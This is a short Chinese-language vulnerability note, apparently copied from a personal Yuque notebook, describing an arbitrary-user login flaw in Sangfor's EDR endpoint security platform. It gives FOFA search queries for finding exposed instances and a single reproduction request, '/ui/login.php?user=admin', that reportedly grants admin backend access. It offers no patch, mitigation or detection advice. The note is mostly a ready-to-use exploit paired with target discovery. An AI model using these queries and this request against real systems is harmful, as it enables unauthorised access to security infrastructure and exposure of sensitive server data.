# 深信服EDR平台存在任意用户登录漏洞

# 一、漏洞简介
 深信服终端检测响应平台EDR,通过云网端联动协同、威胁情报共享、多层级响应机制,帮助用户快速处置终端安全问题,构建轻量级、智能化、响应快的下一代终端安全系统。该EDR系统存在任意用户登录漏洞，攻击者通过漏洞可以登录系统后台并获取服务器的敏感信息。

# 二、影响版本
+ 深信服EDR

# 三、资产测绘
+ fofa`<font style="color:rgba(0, 0, 0, 0.9);">app="SANGFOR-EDR"</font>``<font style="color:rgba(0, 0, 0, 0.9);">title="终端检测响应平台"</font>`

![1716179568863-6a3ef6e1-44be-4250-a0b9-6e869186adc6.png](./img/sKnLfiYkMwtg-rAE/1716179568863-6a3ef6e1-44be-4250-a0b9-6e869186adc6-627743.png)

# 四、漏洞复现
```plain
/ui/login.php?user=admin
```

![1716179600545-25ccad33-6f0c-4979-85ee-1e4a54c2d137.png](./img/sKnLfiYkMwtg-rAE/1716179600545-25ccad33-6f0c-4979-85ee-1e4a54c2d137-926641.png)



> 更新: 2024-05-23 13:32:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/iz3fn97qincapxmq>